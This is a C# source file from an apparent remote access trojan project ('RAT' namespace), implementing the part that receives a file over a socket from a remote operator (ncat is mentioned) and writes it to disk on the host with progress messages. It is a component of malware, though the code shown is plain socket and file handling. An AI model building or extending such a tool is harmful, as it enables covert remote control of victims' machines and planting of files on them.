using RAT.Interfaces;
using RAT.Models;
using RAT.Models.Enums;
using System;
using System.IO;
using System.Net.Sockets;
using System.Timers;

namespace RAT.Logic.Sockets.Connection.SocketConnectionReceive
{
    /// <summary>
    /// Contains logic to process file data received by client.
    /// </summary>
    public class SocketConnectionFileReceiveLogic : ISocketConnectionFileReceiveLogic
    {
        private readonly ISocketStateLogic _socketStateLogic;
        private readonly IClientNotificationLogic _notificationLogic;
        private readonly ISocketConnectionDisconnectLogic _socketConnectionDisconnectLogic;

        /// <summary>
        /// Suffixes to show during file upload progress.
        /// </summary>
        private readonly string[] _sizeSuffixes = { "bytes", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB" };

        /// <summary>
        /// Timer to show notifications during file upload.
        /// </summary>
        private Timer _notificationTimer { get; set; }

        /// <summary>
        /// Contains logic to process file data received by client.
        /// </summary>
        /// <param name="socketStateLogic">State of out client/connection.</param>
        /// <param name="notificationLogic">Logic for client notification.</param>
        /// <param name="socketConnectionDisconnectLogic">Logic for ability to disconnect from socket.</param>
        public SocketConnectionFileReceiveLogic(
            ISocketStateLogic socketStateLogic,
            IClientNotificationLogic notificationLogic,
            ISocketConnectionDisconnectLogic socketConnectionDisconnectLogic)
        {
            _socketStateLogic = socketStateLogic;
            _notificationLogic = notificationLogic;
            _socketConnectionDisconnectLogic = socketConnectionDisconnectLogic;
        }

        /// <summary>
        /// Wrapper for initial(first) file data receive.
        /// </summary>
        /// <param name="socket">Our connection.</param>
        public void BeginFileDataReceive(Socket socket)
        {
            var state = _socketStateLogic.State;
            if (state.FileUploadInformation.FileUploadProgress != FileUploadProgress.Begins)
            {
                return;
            }

            state.FileUploadInformation.FileDataArray = new byte[state.FileUploadInformation.FileDataArraySizeInBytes];
            _notificationLogic.NotifyClient($"\nReceiving file data...");
            _notificationLogic.NotifyClient($"\nNOTE: upload speed might be VERY slow with ncat, check \"ncat transfer rate incredibly slow #1026\" in github");
            this.LaunchTimerForUploadProgress();
            socket.BeginReceive(
                state.FileUploadInformation.FileDataArray,
                0,
                state.FileUploadInformation.FileDataArray.Length,
                0,
                OnFileDataReceive,
                state);
        }

        /// <summary>
        /// Method to call for continuous data receive (after BeginFileDataReceive)
        /// </summary>
        /// <param name="socket">Our connection.</param>
        private void ContinueFileDataReceive(Socket socket)
        {
            var state = _socketStateLogic.State;
            socket.BeginReceive(
                state.FileUploadInformation.FileDataArray,
                0,
                state.FileUploadInformation.FileDataArray.Length,
                0,
                OnFileDataReceive,
                state);
        }

        /// <summary>
        /// File data receival logic handling.
        /// </summary>
        /// <param name="asyncResult">Status of asynchronous operation.</param>
        private void OnFileDataReceive(IAsyncResult asyncResult)
        {
            // Read data from the client socket.
            StateObject state = _socketStateLogic.GetStateFromAsyncResult(asyncResult);
            var fileHandle = state.FileUploadInformation.FileHandle;
            if (fileHandle == null)
            {
                fileHandle = File.Create(state.FileUploadInformation.PathForFileUpload);
                state.FileUploadInformation.FileHandle = fileHandle;
            }

            int bytesReceved = this.EndReceiveAndGetReceivedBytesCount(state.FileUploadInformation.ClientFileUploadSocket, asyncResult);
            var fileData = state.FileUploadInformation.FileDataArray;

            // Check if some data was received at all.
            if (fileData == null || (bytesReceved == 0 && fileData.Length == 0))
            {
                _notificationLogic.NotifyClient("\nReceived 0 bytes");
                state.CurrentRatCommand.Abort();
                return;
            }

            if (bytesReceved > 0)
            {
                state.FileUploadInformation.FileUploadProgress = FileUploadProgress.InProgress;
                try
                {
                    fileHandle.Write(fileData, 0, bytesReceved);
                }
                catch (Exception exception)
                {
                    _notificationLogic.NotifyClient($"\nError during file write {exception.Message}\n");
                    state.CurrentRatCommand.Abort();
                    return;
                }

                this.ContinueFileDataReceive(state.FileUploadInformation.ClientFileUploadSocket);
                return;
            }

            // Finish upload.
            _notificationTimer.Stop();
            _notificationLogic.NotifyClient($"\nFile successfully uploaded on {state.FileUploadInformation.PathForFileUpload}\n");
            state.FileUploadInformation.FileUploadProgress = FileUploadProgress.Finished;
            _socketConnectionDisconnectLogic.DisconnectSocket(state.FileUploadInformation.ClientFileUploadSocket);
            try
            {
                state.FileUploadInformation.FileHandle.Dispose();
                state.FileUploadInformation.FileHandle.Close();
            }
            catch (Exception) { }
        }

        /// <summary>
        /// Launches timer with delegate for client notification.
        /// </summary>
        private void LaunchTimerForUploadProgress()
        {
            Timer notificationTimer = new Timer();
            notificationTimer.Elapsed += delegate
            {
                _notificationLogic.NotifyClient(GetFileUploadProgress());
            };

            notificationTimer.Interval = 5000;
            notificationTimer.Enabled = true;
            _notificationTimer = notificationTimer;
        }

        /// <summary>
        /// Gets file upload progress in kilobytes.
        /// https://stackoverflow.com/questions/14488796/does-net-provide-an-easy-way-convert-bytes-to-kb-mb-gb-etc
        /// </summary>
        /// <returns>String with upload progress.</returns>
        private string GetFileUploadProgress()
        {
            int value = (int)_socketStateLogic.State.FileUploadInformation.FileHandle.Length;
            int decimalPlaces = 1;

            // mag is 0 for bytes, 1 for KB, 2, for MB, etc.
            int mag = (int)Math.Log(value, 1024);

            // 1L << (mag * 10) == 2 ^ (10 * mag)
            // [i.e. the number of bytes in the unit corresponding to mag]
            decimal adjustedSize = (decimal)value / (1L << (mag * 10));

            // make adjustment when the value is large enough that
            // it would round up to 1000 or more
            if (Math.Round(adjustedSize, decimalPlaces) >= 1000)
            {
                mag += 1;
                adjustedSize /= 1024;
            }

            return string.Format("\nUpload progress:{0:n" + decimalPlaces + "}{1}",
                adjustedSize,
                _sizeSuffixes[mag]);
        }

        /// <summary>
        /// Ends data receival and gets bytes received.
        /// </summary>
        /// <param name="socket">Socket to get bytes count from.</param>
        /// <param name="result">Status of asynchronous operation.</param>
        /// <returns>Bytes received.</returns>
        private int EndReceiveAndGetReceivedBytesCount(Socket socket, IAsyncResult result)
        {
            int bytesReceved = 0;
            try
            {
                bytesReceved = socket.EndReceive(result);
            }
            catch (Exception exception)
            {
                _notificationLogic.NotifyClient($"\nError during data receive: {exception.Message}");
            }

            return bytesReceved;
        }
    }
}